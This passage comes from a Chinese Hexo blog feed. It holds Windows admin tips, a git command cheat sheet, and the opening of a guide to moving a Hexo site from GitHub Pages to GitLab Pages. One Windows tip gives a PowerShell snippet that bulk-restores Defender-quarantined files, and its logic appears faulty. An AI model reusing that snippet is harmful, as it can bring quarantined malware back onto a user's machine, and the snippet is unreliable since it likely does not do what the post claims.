组成员</p><h1 id="cmd命令行重启服务"><a href="#cmd命令行重启服务" class="headerlink" title="cmd命令行重启服务"></a>cmd命令行重启服务</h1><p>列出当前的服务名称</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span> | findstr &lt;服务名称&gt;<br></code></pre></td></tr></table></figure><p>停止服务</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net stop &lt;服务名称&gt;<br></code></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &lt;服务名称&gt;<br></code></pre></td></tr></table></figure><h1 id="win11右键菜单样式切换回win10样式-cmd命令"><a href="#win11右键菜单样式切换回win10样式-cmd命令" class="headerlink" title="win11右键菜单样式切换回win10样式(cmd命令)"></a>win11右键菜单样式切换回win10样式(cmd命令)</h1><p>win11右键菜单样式切换到win10样式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot;</span> /f /ve</span><br></code></pre></td></tr></table></figure><p>恢复</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">reg delete &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0<span class="hljs-string">-34</span>aa<span class="hljs-string">-4</span>e8b-a509<span class="hljs-string">-50</span>c905bae2a2&#125;&quot; /f<br></code></pre></td></tr></table></figure><h1 id="win11关机被软件阻止的解决办法"><a href="#win11关机被软件阻止的解决办法" class="headerlink" title="win11关机被软件阻止的解决办法"></a>win11关机被软件阻止的解决办法</h1><p>win+r：regedit</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">计算机<span class="hljs-string">\HKEY_CURRENT_USER\Control</span> Panel<span class="hljs-string">\Desktop</span><br></code></pre></td></tr></table></figure><p>新建字符串值：AutoEndTasks , 键值为：1</p><h1 id="去除Win10右键菜单使用Windows-Defender扫描"><a href="#去除Win10右键菜单使用Windows-Defender扫描" class="headerlink" title="去除Win10右键菜单使用Windows Defender扫描"></a>去除Win10右键菜单使用Windows Defender扫描</h1><p>cmd管理员权限执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">regsvr32 /u <span class="hljs-string">&quot;%ProgramFiles%\Windows Defender\shellext.dll&quot;</span><br></code></pre></td></tr></table></figure><p>要恢复执行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">regsvr32</span> <span class="hljs-string">&quot;%ProgramFiles%\Windows Defender\shellext.dll&quot;</span><br></code></pre></td></tr></table></figure><h1 id="Windows系统封装初始化工具"><a href="#Windows系统封装初始化工具" class="headerlink" title="Windows系统封装初始化工具"></a>Windows系统封装初始化工具</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sysprep</span><br></code></pre></td></tr></table></figure><p>win+r 键入 sysprep即可找到启动文件</p><h1 id="磁盘修复"><a href="#磁盘修复" class="headerlink" title="磁盘修复"></a>磁盘修复</h1><p>#为要修复的磁盘盘符</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chkdsk</span> <span class="hljs-comment">#: /f /r /x</span><br></code></pre></td></tr></table></figure><p>更多参考文章：<a href="https://www.disktool.cn/content-center/check-hard-drive-for-errors-windows-10-2111.html">https://www.disktool.cn/content-center/check-hard-drive-for-errors-windows-10-2111.html</a></p><h1 id="iis配置"><a href="#iis配置" class="headerlink" title="iis配置"></a>iis配置</h1><h2 id="修改文件上传大小限制（最大4G）"><a href="#修改文件上传大小限制（最大4G）" class="headerlink" title="修改文件上传大小限制（最大4G）"></a>修改文件上传大小限制（最大4G）</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">system.webServer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">security</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">requestFiltering</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">requestLimits</span> <span class="hljs-attr">maxAllowedContentLength</span>=<span class="hljs-string">&quot;4294967295&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">fileExtensions</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">fileExtensions</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">requestFiltering</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">security</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">system.webServer</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">system.web</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">httpRuntime</span> <span class="hljs-attr">maxRequestLength</span>=<span class="hljs-string">&quot;2147483647&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">system.web</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="cmd命令设置代理"><a href="#cmd命令设置代理" class="headerlink" title="cmd命令设置代理"></a>cmd命令设置代理</h1><p>http协议</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-attribute">http_proxy</span>=http://127.0.0.1:10808<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">https_proxy</span>=http://127.0.0.1:10808<br></code></pre></td></tr></table></figure><p>socks协议</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-attribute">http_proxy</span>=socks5://127.0.0.1:10808<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">https_proxy</span>=socks5://127.0.0.1:10808<br></code></pre></td></tr></table></figure><h1 id="关机被阻止解决方法-“此应用程序阻止关机”"><a href="#关机被阻止解决方法-“此应用程序阻止关机”" class="headerlink" title="关机被阻止解决方法-“此应用程序阻止关机”"></a>关机被阻止解决方法-“此应用程序阻止关机”</h1><p>按 Win + R 打开运行窗口，输入 regedit 并按回车，打开注册表编辑器。<br>依次导航到以下路径：<code>HKEY_USERS\.DEFAULT\Control Panel\Desktop</code><br>在右侧窗口中，右键单击，选择“新建” -&gt; “字符串值”，命名为：<code>AutoEndTasks</code>。<br>双击 AutoEndTasks，将其值设置为 1</p><h1 id="批量还原被Windows-Defender隔离的文件"><a href="#批量还原被Windows-Defender隔离的文件" class="headerlink" title="批量还原被Windows Defender隔离的文件"></a>批量还原被Windows Defender隔离的文件</h1><p>以管理员身份打开PowerShell。</p><ul><li>列出被隔离的文件<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-MpThreatDetection | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123; $_.InitialDetectionTime -gt (<span class="hljs-keyword">Get</span>-<span class="hljs-type">Date</span>).AddDays(<span class="hljs-number">-30</span>) &#125; | <span class="hljs-keyword">Format</span>-<span class="hljs-keyword">Table</span> -Property InitialDetectionTime,Resources<br></code></pre></td></tr></table></figure></li><li>批量还原文件<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-MpThreatDetection</span> | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.Actions <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Quarantine&quot;</span> &#125; | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$_</span>.Resources<br>    <span class="hljs-built_in">Move-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$filePath</span> <span class="hljs-literal">-Destination</span> (<span class="hljs-built_in">Split-Path</span> <span class="hljs-variable">$filePath</span> <span class="hljs-literal">-Parent</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li>验证是否还原成功，如果输出为空，说明没有文件被隔离，还原成功。如果仍有文件被隔离，说明还原未完全成功。<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-MpThreatDetection | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123; $_.Actions -eq &quot;Quarantine&quot; &#125; | <span class="hljs-keyword">Format</span>-<span class="hljs-keyword">Table</span> -Property InitialDetectionTime,Resources<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用git命令整理</title>
    <link href="/2024/05/07/%E7%BC%96%E7%A8%8B/%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
    <url>/2024/05/07/%E7%BC%96%E7%A8%8B/%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="初始化与配置"><a href="#初始化与配置" class="headerlink" title="初始化与配置"></a>初始化与配置</h1><h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a><code>ssh-keygen</code></h3><ul><li>作用：生成密钥文件，用于连接远程仓库<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的GitHub注册邮箱&quot;</span><br></code></pre></td></tr></table></figure></li><li>密钥默认存储路径：<code>C:\Users\&lt;user&gt;\.ssh</code></li></ul><h3 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a><code>git config</code></h3><ul><li>作用：配置 Git 的全局或本地参数（如用户名、邮箱）。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;YourName&quot;</span>             <span class="hljs-comment"># 全局配置用户名</span><br>git config --global user.email <span class="hljs-string">&quot;email@example.com&quot;</span>   <span class="hljs-comment"># 全局配置邮箱</span><br></code></pre></td></tr></table></figure></li><li>注意：<code>--global</code> 表示全局生效，省略则仅对当前仓库生效 。</li></ul><h3 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a><code>git init</code></h3><ul><li>作用：初始化当前目录为 Git 仓库，生成隐藏的 <code>.git</code> 文件夹。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git init           <span class="hljs-comment"># 初始化当前目录</span><br>git init newDir    <span class="hljs-comment"># 在指定目录 newDir 中初始化仓库</span><br></code></pre></td></tr></table></figure></li><li>场景：用于从零开始创建本地仓库 。</li></ul><h1 id="状态管理"><a href="#状态管理" class="headerlink" title="状态管理"></a>状态管理</h1><h3 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a><code>git status</code></h3><ul><li>作用：显示工作目录和暂存区的文件状态（如未跟踪、已修改）。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git status      <span class="hljs-comment"># 显示完整状态</span><br>git status -s   <span class="hljs-comment"># 显示简洁状态（如 M-修改、A-新增、??-未跟踪）</span><br></code></pre></td></tr></table></figure></li><li>场景：确认哪些文件需要提交或暂存 。</li></ul><h3 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a><code>git diff</code></h3><ul><li>作用：比较文件修改内容。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git diff           <span class="hljs-comment"># 比较工作区与暂存区的差异</span><br>git diff --cached  <span class="hljs-comment"># 比较暂存区与最新提交的差异</span><br>git diff HEAD      <span class="hljs-comment"># 比较工作区与最新提交的差异</span><br></code></pre></td></tr></table></figure></li><li>场景：查看未提交的具体改动 。</li></ul><h1 id="提交与推送"><a href="#提交与推送" class="headerlink" title="提交与推送"></a>提交与推送</h1><h3 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a><code>git add</code></h3><ul><li>作用：将文件添加到暂存区，准备提交。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add .               <span class="hljs-comment"># 添加所有修改和新文件</span><br>git add *.js            <span class="hljs-comment"># 添加所有 .js 文件</span><br>git add -u              <span class="hljs-comment"># 仅添加已跟踪文件的修改</span><br></code></pre></td></tr></table></figure></li><li>场景：选择性暂存文件以分批次提交 。</li></ul><h3 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a><code>git commit</code></h3><ul><li>作用：将暂存区的修改提交到本地仓库。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git commit -m <span class="hljs-string">&quot;Fix login bug&quot;</span>   <span class="hljs-comment"># 提交并添加描述</span><br>git commit -am <span class="hljs-string">&quot;Quick fix&quot;</span>      <span class="hljs-comment"># 跳过 `git add`，直接提交已跟踪文件的修改</span><br></code></pre></td></tr></table></figure></li><li>注意：<code>-a</code> 参数仅对已跟踪文件生效 。</li></ul><h3 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a><code>git push</code></h3><ul><li><p>作用：推送本地提交到远程仓库。  </p></li><li><p>示例1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git push -u origin main       <span class="hljs-comment"># 首次推送并建立追踪关系</span><br>git push origin main          <span class="hljs-comment"># 推送本地 main 分支到远程</span><br>git push --force              <span class="hljs-comment"># 强制覆盖远程提交（可简化为-f）</span><br></code></pre></td></tr></table></figure></li><li><p>示例2：首次推送并建立追踪关系</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git remote add origin &lt;远程仓库地址&gt;      <span class="hljs-comment"># 关联远程仓库（仅首次）</span><br>git add -A                              <span class="hljs-comment"># 添加所有修改到暂存区</span><br>git commit -m <span class="hljs-string">&quot;init&quot;</span>                    <span class="hljs-comment"># 提交到本地仓库</span><br>git push -u origin main                 <span class="hljs-comment"># 推送并设置上游分支</span><br></code></pre></td></tr></table></figure></li><li><p>示例3：后续更新推送</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add -A                  <span class="hljs-comment"># 添加所有修改到暂存区</span><br>git commit -m <span class="hljs-string">&quot;update&quot;</span>      <span class="hljs-comment"># 提交到本地仓库</span><br>git push origin main        <span class="hljs-comment"># 推送到远程仓库</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>后续更新推送简化命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add -A &amp;&amp; git commit -m <span class="hljs-string">&quot;update&quot;</span> &amp;&amp; git push<br></code></pre></td></tr></table></figure><ul><li>场景：分享代码或同步远程仓库 。</li></ul><h3 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a><code>git log</code></h3><ul><li>作用：查看提交历史记录。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span>              <span class="hljs-comment"># 显示完整提交历史</span><br>git <span class="hljs-built_in">log</span> --oneline    <span class="hljs-comment"># 单行显示提交信息</span><br>git <span class="hljs-built_in">log</span> -p           <span class="hljs-comment"># 显示具体修改内容</span><br></code></pre></td></tr></table></figure></li><li>场景：追溯代码变更或定位问题 。</li></ul><h1 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h1><h3 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a><code>git branch</code></h3><ul><li>作用：管理分支（创建、删除、查看）。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch              <span class="hljs-comment"># 查看本地分支</span><br>git branch -a           <span class="hljs-comment"># 查看所有分支（本地+远程）</span><br>git branch dev          <span class="hljs-comment"># 创建 dev 分支</span><br>git branch -d dev       <span class="hljs-comment"># 删除已合并的 dev 分支</span><br>git branch -D dev       <span class="hljs-comment"># 强制删除未合并的分支</span><br></code></pre></td></tr></table></figure></li><li>场景：并行开发不同功能或修复 。</li></ul><h3 id="git-checkout-git-switch"><a href="#git-checkout-git-switch" class="headerlink" title="git checkout &#x2F; git switch"></a><code>git checkout</code> &#x2F; <code>git switch</code></h3><ul><li>作用：切换分支或恢复文件。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout dev                  <span class="hljs-comment"># 切换到 dev 分支</span><br>git checkout -b feature           <span class="hljs-comment"># 创建并切换到 feature 分支</span><br>git checkout HEAD~2 file.txt      <span class="hljs-comment"># 恢复文件到前两次提交的版本</span><br></code></pre></td></tr></table></figure></li><li>注意：<code>git switch</code> 是更语义化的替代命令 。</li></ul><h3 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a><code>git merge</code></h3><ul><li>作用：合并指定分支到当前分支。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git merge dev       <span class="hljs-comment"># 将 dev 分支合并到当前分支</span><br>git merge --no-ff   <span class="hljs-comment"># 强制生成合并提交（避免快进合并）</span><br></code></pre></td></tr></table></figure></li><li>场景：集成已完成的功能分支 。</li></ul><h1 id="远程仓库操作"><a href="#远程仓库操作" class="headerlink" title="远程仓库操作"></a>远程仓库操作</h1><h3 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a><code>git remote</code></h3><ul><li>作用：管理远程仓库关联。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git remote add origin &lt;url&gt;           <span class="hljs-comment"># 关联远程仓库</span><br>git remote -v                         <span class="hljs-comment"># 查看远程仓库 URL</span><br>git remote set-url origin &lt;new_url&gt;   <span class="hljs-comment"># 更新远程仓库地址</span><br></code></pre></td></tr></table></figure></li><li>场景：配置协作开发的远程代码源 。</li></ul><h3 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a><code>git clone</code></h3><ul><li>作用：克隆远程仓库到本地，支持多种协议（SSH、HTTPS、GIT）。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:user/repo.git             <span class="hljs-comment"># 使用 SSH 协议克隆</span><br>git <span class="hljs-built_in">clone</span> https://github.com/user/repo.git myDir   <span class="hljs-comment"># 克隆到指定目录 myDir</span><br></code></pre></td></tr></table></figure></li><li>场景：快速获取远程代码库并建立本地副本 。</li></ul><h3 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a><code>git pull</code></h3><ul><li><p>作用：拉取远程分支并合并到当前分支（相当于 <code>git fetch</code> + <code>git merge</code>）。  </p></li><li><p>示例：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git pull origin main    <span class="hljs-comment"># 拉取远程 main 分支并合并</span><br>git pull --rebase       <span class="hljs-comment"># 使用 rebase 代替合并（保持提交历史线性）</span><br></code></pre></td></tr></table></figure></li><li><p>注意：频繁使用可避免代码冲突 。</p></li><li><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset --hard    <span class="hljs-comment"># 回退到最后一次提交</span><br>git pull            <span class="hljs-comment"># 拉取远程分支的更新，并尝试和当前分支合并</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a><code>git fetch</code></h3><ul><li><p>作用：拉取远程仓库的最新代码</p></li><li><p>实例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git fetch origin                <span class="hljs-comment"># 拉取当前仓库对应的远程仓库的最新代码</span><br>git reset --hard origin/main    <span class="hljs-comment"># 强制将远程对应分支覆盖本地当前分支</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="撤销与恢复"><a href="#撤销与恢复" class="headerlink" title="撤销与恢复"></a>撤销与恢复</h1><h3 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a><code>git reset</code></h3><ul><li>作用：回退到指定提交状态，支持不同模式：  </li><li><code>--soft</code>：保留工作区和暂存区修改。  </li><li><code>--mixed</code>（默认）：保留工作区修改，重置暂存区。  </li><li><code>--hard</code>：丢弃所有修改。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset HEAD~1         <span class="hljs-comment"># 回退到前一次提交（保留修改）</span><br>git reset --hard HEAD~3  <span class="hljs-comment"># 强制回退到前三次提交（丢失所有修改）</span><br></code></pre></td></tr></table></figure></li><li>场景：撤销未提交的修改或错误提交 。</li></ul><h3 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a><code>git stash</code></h3><ul><li>作用：临时保存未提交的修改，恢复工作目录到干净状态。  </li><li>示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git stash              <span class="hljs-comment"># 保存当前修改</span><br>git stash list         <span class="hljs-comment"># 查看暂存列表</span><br>git stash pop          <span class="hljs-comment"># 恢复最近一次暂存的修改并删除记录</span><br></code></pre></td></tr></table></figure></li><li>场景：快速切换分支处理紧急任务 。</li></ul><h1 id="其他实用命令"><a href="#其他实用命令" class="headerlink" title="其他实用命令"></a>其他实用命令</h1><ul><li><code>git tag</code>：为提交打标签（常用于版本发布）。  </li><li><code>git rebase</code>：变基操作，重写提交历史（需谨慎使用）。  </li><li><code>git cherry-pick</code>：选择性地应用某次提交到当前分支。  </li><li><code>git reflog</code>：查看所有操作记录（包括已删除的提交）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo从GitHub迁移到GitLab</title>
    <link href="/2024/04/30/WEB/Hexo%E4%BB%8EGitHub%E8%BF%81%E7%A7%BB%E5%88%B0GitLab/"/>
    <url>/2024/04/30/WEB/Hexo%E4%BB%8EGitHub%E8%BF%81%E7%A7%BB%E5%88%B0GitLab/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本用github搭建的hexo，后来听说gitlab更合适hexo，能实现云端编译、私有库page公开、搜索引擎收录、节点较快等等一系列优点，于是改用gitlab。网上的教程质量也是参差不齐，于是自己整理一番</p><h1 id="GitLab-Pages简介与GitHub-Pages对比"><a href="#GitLab-Pages简介与GitHub-Pages对比" class="headerlink" title="GitLab Pages简介与GitHub Pages对比"></a>GitLab Pages简介与GitHub Pages对比</h1><p>GitLab与Github类似，而且对开源社区更友好，很多大型开源项目，如GNOME、Debian都在向GitLab迁移。GitLab每个代码库空间限制为10G，文件大小不限，仓库数量不限，包括私有仓库的数量；需注意的是GitLab CI&#x2F;CD 限制仓库大小1G，单文件100M，GitLab Pages因为要使用CI&#x2F;CD也受此限制 。作为对比，Github每个代码库空间软性限制1G，单文件100M，且私有仓库为付费项目。</p><p>与Github中类似，任何项目都可开启项目页面(Project Page)，但普通项目开启页面后访问网址为 <code>https://username.gitlab.io/projectpath</code>；只有路径为<code>username.gitlab.io</code>的项目的页面才直接对应于网址<code>https://username.gitlab.io</code>，也被称为用户页面(User Page)。所谓项目路径默认即为项目名称，但不同于Github，GitLab中项目的名称可以与路径不同。</p><p>但GitLab中建立Pages的思路与GitHub完全不同。对于Github，使用Hexo的流程为，首先在本地安装各种Hexo插件，之后运行Hexo generate在本地生成各种页面，最后再执行Hexo deploy部署到远程，就可以访问了。整个过程无需git操作，在_config.yml中设置好仓库并配置好SSH密钥，Hexo会自动调用Git进行操作，git目录是位于博客目录下的.deploy_git。</p><p>而对于GitLab，由于其提供了基于Docker的持续集成&#x2F;持续部署(CI&#x2F;CD)服务，上述所有操作都可以在云端实现，而无需本地操作，包括插件安装都在云端完成。而为此需要配置一个名为.gitlab-ci.yml的文件，告诉GitLab所需要执行的操作，内容为执行的脚本及处理的文件等。整个过程本地完全无需hexo generate和hexo deploy，而是将博客源文件作为git管理的代码，完全使用git操作。将博客目录推送到GitLab上后，会由一个名为GitLab-Runner的程序在云端根据.gitlab-ci.yml的内容处理你的源文件。与在本地类似，这个过程需要需要2-3分钟。</p><p>使用时，最好在本地修改好后再push，类似于先在本地做好代码的调试，再推送到代码库，而不要频繁修改推送(可以在本地多次commit，然后一次性push)。因为每次推送都会自动触发Runner对文件的处理，由于是免费公共资源，短时间内使用次数太多，会出现排队，需等待较长时间。为了实时查看效果，方便编辑，可以在本地hexo s来预览，只是不要在本地执行Hexo g -d。</p><p>总结起来就是：Github需要在本地手动执行Hexo，生成并部署网页；而GitLab则只需提供源文件，在云端自动生成及部署。</p><p>两种思路其实各有优劣：</p><ul><li>GitHub的方式，需要用户在本地安装Node.js、Hexo及相关插件，但是操作完全在本地，更加直观。而且整个过程只需要使用基本的Hexo命令，不需要了解太深入的Git知识，对于一般用户更友好。不好的是最终推送到代码库中的内容是Hexo处理生成的网页，而并非源文件，不符合Git管理源代码的思路。</li><li>GitLab的方式，Hexo对文件的处理部署都在云端执行，不是很直观。用户甚至不需要在本地安装任何Node.js、Hexo的东西，当然为了方便预览、编辑，还是装上了比较好。整个操作完全由Git完成，需要用户熟悉Git的用法，其思路本质就是Git管理源码的思路，最终仓库内容与本地源文件一致。</li></ul><h1 id="gielab配置"><a href="#gielab配置" class="headerlink" title="gielab配置"></a>gielab配置</h1><p>新建一个<code>私有项目</code>，命名方式要和GitHub上搭建hexo一样，<code>username.gitlab.io</code>，然后有几个需要注意的地方</p><ul><li>打开pages所有人访问</li></ul><p><img src="/2024/04/30/WEB/Hexo%E4%BB%8EGitHub%E8%BF%81%E7%A7%BB%E5%88%B0GitLab/image.png" alt="alt text"></p><p>因为项目是私密的，不能让别人看到源文件，但是可以对所有人开放pages权限，这样就不影响他人阅读，但是无法拷贝项目源文件下来</p><ul><li>关闭随机域</li></ul><p><img src="/2024/04/30/WEB/Hexo%E4%BB%8EGitHub%E8%BF%81%E7%A7%BB%E5%88%B0GitLab/image-1.png" alt="alt text"></p><p>如果不关闭这个，访问的时候域名末尾会自动加上一串随机字符，导致加载速度变慢、图片链接失效等情况</p><ul><li>关闭分支保护</li></ul><p><img src="/2024/04/30/WEB/Hexo%E4%BB%8EGitHub%E8%BF%81%E7%A7%BB%E5%88%B0GitLab/image-2.png" alt="alt 